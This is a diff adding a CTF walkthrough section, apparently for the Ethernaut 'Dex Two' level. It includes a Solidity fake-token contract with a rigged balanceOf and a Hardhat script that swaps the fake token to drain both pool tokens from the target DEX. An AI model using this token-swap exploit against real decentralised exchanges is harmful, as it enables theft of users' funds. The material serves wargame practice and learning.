@@ -877,3 +877,84 @@ main().catch((error) => {
   process.exitCode = 1;
 });
 ```
+
+## 23 Dex Two
+
+Change the DexTwo.sol imports to be
+- `@openzeppelin/contracts/token/ERC20/IERC20.sol`
+- `@openzeppelin/contracts/token/ERC20/ERC20.sol`
+- `@openzeppelin/contracts/access/Ownable.sol`
+And run `npm install @openzeppelin/contracts`
+
+```sol
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+
+contract FakeToken is ERC20 {
+  bool targetToken1;
+
+  constructor(string memory name, string memory symbol, address _dex) ERC20(name, symbol) {
+    _mint(msg.sender, 2); // Only two transfers required
+    targetToken1 = true;
+  }
+
+  function switchTargets() public {
+    targetToken1 = !targetToken1;
+  }
+
+  function balanceOf(address account) public view override returns(uint256) {
+    // In order for DexTwo.getSwapAmount to return the full balance, return a value such that:
+    //   amount * balance / retval => balance, where amount = 1
+    return 1;
+  }
+}
+```
+
+```js
+const hre = require("hardhat");
+
+async function main() {
+  const targetAddress = "<target contract address>";
+  const targetContract = (await hre.ethers.getContractFactory("DexTwo")).attach(targetAddress);
+  const [ token1, token2 ] = [ await targetContract.token1(), await targetContract.token2() ];
+
+  const contract = await hre.ethers.deployContract("FakeToken", ["FakeToken", "F", targetAddress]);
+  await contract.waitForDeployment();
+  console.log(`Contract address: ${await contract.getAddress()}`);
+
+  const [ signer ] = await hre.ethers.getSigners();
+
+  console.log(
+    "Target, Player = " +
+    `${await targetContract.balanceOf(token1, targetAddress)} ${await targetContract.balanceOf(token2, targetAddress)}, ` +
+    `${await targetContract.balanceOf(token1, signer.address)} ${await targetContract.balanceOf(token2, signer.address)}`
+  );
+
+  (await contract.approve(targetAddress, 1)).wait();
+  (await targetContract.approve(targetAddress, 1)).wait();
+  (await targetContract.swap(await contract.getAddress(), token1, 1)).wait();
+  
+  console.log(
+    "Target, Player = " +
+    `${await targetContract.balanceOf(token1, targetAddress)} ${await targetContract.balanceOf(token2, targetAddress)}, ` +
+    `${await targetContract.balanceOf(token1, signer.address)} ${await targetContract.balanceOf(token2, signer.address)}`
+  );
+
+  (await contract.switchTargets()).wait();
+  (await contract.approve(targetAddress, 1)).wait();
+  (await targetContract.approve(targetAddress, 1)).wait();
+  (await targetContract.swap(await contract.getAddress(), token2, 1)).wait();
+
+  console.log(
+    "Target, Player = " +
+    `${await targetContract.balanceOf(token1, targetAddress)} ${await targetContract.balanceOf(token2, targetAddress)}, ` +
+    `${await targetContract.balanceOf(token1, signer.address)} ${await targetContract.balanceOf(token2, signer.address)}`
+  );
+}
+
+main().catch((error) => {
+  console.error(error);
+  process.exitCode = 1;
+});
+```
